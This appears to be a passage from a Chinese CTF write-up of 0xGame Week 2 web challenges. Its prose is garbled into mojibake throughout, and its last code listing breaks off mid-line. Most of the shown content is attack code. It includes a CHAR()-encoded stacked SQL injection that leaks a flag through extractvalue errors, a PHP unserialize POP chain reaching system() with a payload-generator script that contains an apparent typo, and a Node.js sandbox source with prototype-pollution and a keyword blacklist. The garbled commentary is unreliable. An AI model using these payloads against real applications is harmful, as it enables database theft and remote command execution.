¼å¥½åƒä¹Ÿä¸èƒ½ç›´æ¥ç”¨ï¼Ÿå€ŸåŠ©<code>char()</code>å‡½æ•°ç›´æ¥æŠŠç¬¬ä¸€æ®µå…¨è½¬æˆå­—ç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br><br></code></pre></td></tr></table></figure><p><code>SET @a=CHAR(115,101,108,101,99,116,32,101,120,116,114,97,99,116,118,97,108,117,101,40,49,44,99,111,110,99,97,116,40,48,120,55,101,44,40,115,101,108,101,99,116,32,102,108,97,103,32,102,114,111,109,32,102,108,97,103,32,108,105,109,105,116,32,48,44,49,41,41,41,59);PREPARE/**/hello/**/FROM/**/@a;EXECUTE/**/hello;</code></p><p><img src="/img/sqli1.png" alt="sqli1"></p><p>è¿”å›ï¼š<code>XPATH syntax error: &#39;~0xGame&#123;4286b62d-c37e-4010-ba9c-&#39;&quot;)</code>,æ²¡æ˜¾ç¤ºå®Œå…¨ï¼Œå¥½åƒå› ä¸ºæŠ¥é”™å‡½æ•°åªèƒ½æ˜¾ç¤º32ä½ï¼Ÿæ”¹ä¸‹<code>payload</code>è®©å®ƒæ˜¾ç¤º<code>flag</code>çš„å30ä½ï¼š<code>flag</code>-&gt;<code>(right(flag,30))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?<span class="hljs-keyword">order</span><span class="hljs-operator">=</span>email;<span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">40</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">PREPARE</span><span class="hljs-comment">/**/</span>hello<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-comment">/**/</span>hello;<br></code></pre></td></tr></table></figure><p><img src="/img/sqli2.png" alt="sqli2"></p><p>æ‹¼èµ·æ¥å¾—åˆ°<code>flag</code>:<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><p>è¿™é¢˜æ²¡åšå‡ºæ¥æŒºå¯æƒœçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//å¼ºè¡ŒæŠŠexpiredè®¾ç½®Falseï¼Œä¹‹å‰ç¢°åˆ°éƒ½æ˜¯åˆ©ç”¨ä¿®æ”¹å±æ€§ä¸ªæ•°ç»•è¿‡ï¼Œä½†å¸ˆå‚…æç¤ºéœ€é€šè¿‡å¼•ç”¨ç»•è¿‡</span><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123; <span class="hljs-comment">//å¦‚æœexpiredä¸ºTrue</span><br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<span class="hljs-comment">//clean?å¥½åƒæ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œé€šè¿‡è¿™ä¸ªè°ƒç”¨__call</span><br>            <span class="hljs-keyword">return</span> True; <span class="hljs-comment">//è¿”å›True</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<span class="hljs-comment">//å°†ä¸€ä¸ªç©ºæ•°ç»„èµ‹å€¼ç»™store</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<span class="hljs-comment">//ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) <br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<span class="hljs-comment">//systemå‡½æ•°</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123; <span class="hljs-comment">//é“¾å­çš„å°¾ï¼Œé€šè¿‡è¿™ä¸ªæ‰§è¡Œå‘½ä»¤</span><br>        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);  <span class="hljs-comment">//system(&#x27;ls&#x27;)ç­‰ï¼Ÿ</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//é“¾å­çš„å¤´</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">//éå†dataæ•°ç»„ï¼Œé”®keyå€¼value</span><br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<span class="hljs-comment">//å°†storageå¯¹è±¡çš„$keyå±æ€§èµ‹å€¼ä¸º$value,æ³¨æ„æ­¤æ—¶å¯ä»¥å»è§¦å‘Storageçš„__setæ–¹æ³•.(ç»™ä¸å¯è®¿é—®çš„å±æ€§èµ‹å€¼)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<span class="hljs-comment">//ååºåˆ—åŒ–</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$c</span> -&gt; expired = False;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br>    <span class="hljs-variable">$a</span>-&gt; data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$d</span>);<span class="hljs-comment">//æ”¾å…¥Cache1å’ŒCache2ï¼Œä¸¤ä¸ªå®ä¾‹</span><br>    <span class="hljs-variable">$a</span>-&gt; storage = <span class="hljs-variable">$b</span>; <span class="hljs-comment">//è¿™é‡Œè§¦å‘äº†Storageä¸­çš„__setæ–¹æ³•</span><br>    <span class="hljs-variable">$b</span>-&gt; store = &amp;<span class="hljs-variable">$d</span>-&gt;expired;<span class="hljs-comment">//é€šè¿‡å¼•ç”¨èµ‹å€¼ç»•è¿‡__wakeupï¼Œstoreå’Œ$dæŒ‡å‘ç›¸åŒçš„å†…å­˜åœ°å€</span><br>    <span class="hljs-variable">$d</span> -&gt; key = <span class="hljs-string">&#x27;id&#x27;</span>;<br>    <span class="hljs-variable">$d</span>-&gt; helper = <span class="hljs-variable">$e</span>;<br>    <span class="hljs-variable">$e</span>-&gt; <span class="hljs-variable">$funcs</span> = [<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><br>DataObject.__destruct<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Storage.__set<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Cache.expired<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Helper.__call()<br><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">å‚è€ƒæ–‡ç« :ttps:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">377676274</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">pear:</span><br><span class="hljs-symbol">https:</span>//longlone.top/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%B6</span>/register_argc_argv<span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>Einclude<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>RCE<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%99</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span>/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/RABCDXB/article/details/<span class="hljs-number">122050370</span><br><br></code></pre></td></tr></table></figure><h3 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h3><p><code>app.js</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span><br>&#125;))<br><br><span class="hljs-keyword">var</span> users = &#123;&#125;<br><span class="hljs-keyword">var</span> admins = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123; <span class="hljs-comment">//mergeï¼ŒåŸå‹é“¾æ±¡æŸ“</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†__protp__</span><br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//ä¸­æ–­è¿­ä»£ï¼Œè¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123; <span class="hljs-comment">//åŒä¸Š</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span 